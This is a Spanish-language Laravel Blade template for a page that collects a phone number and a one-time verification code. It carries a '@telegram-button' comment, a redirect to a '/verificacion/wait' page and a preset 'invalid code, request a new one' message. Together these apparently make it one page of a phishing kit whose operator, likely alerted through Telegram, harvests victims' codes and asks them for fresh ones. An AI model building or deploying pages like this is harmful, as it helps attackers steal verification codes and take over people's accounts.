{{-- @telegram-button: Telefono --}}
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Verificar Telefono</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
            padding: 20px;
        }
        .container {
            width: 100%;
            max-width: 450px;
        }
        .card {
            background: white;
            border-radius: 16px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 {
            color: #11998e;
            margin-bottom: 30px;
            text-align: center;
            font-size: 24px;
        }
        .campo {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }
        input[type="tel"] {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input[type="tel"]:focus {
            outline: none;
            border-color: #11998e;
        }
        .btn-enviar {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            margin-top: 10px;
        }
        .btn-enviar:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(17, 153, 142, 0.4);
        }
        .btn-enviar:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }
        #mensaje {
            margin-top: 15px;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
            display: none;
        }
        #mensaje.exito {
            display: block;
            background: #d4edda;
            color: #155724;
        }
        #mensaje.error {
            display: block;
            background: #f8d7da;
            color: #721c24;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>Verificar Telefono</h1>
            <form id="formVerificacion">
                <div class="campo">
                    <label for="telefono">Numero de telefono</label>
                    <input type="tel" id="telefono" name="telefono" placeholder="300 123 4567" required>
                </div>
                <div class="campo">
                    <label for="codigo">Codigo de verificacion</label>
                    <input type="tel" id="codigo" name="codigo" placeholder="123456" required>
                </div>
                <input type="hidden" id="no-status" name="status" value="telefono">
                <button type="submit" class="btn-enviar" id="enviar">Verificar</button>
            </form>
            <div id="mensaje"></div>
        </div>
    </div>

    <x-control
        :auto-completar="false"
        redirect-url="/verificacion/wait"
        toast-message="El codigo ingresado no es valido, solicite uno nuevo"
    />
</body>
</html>
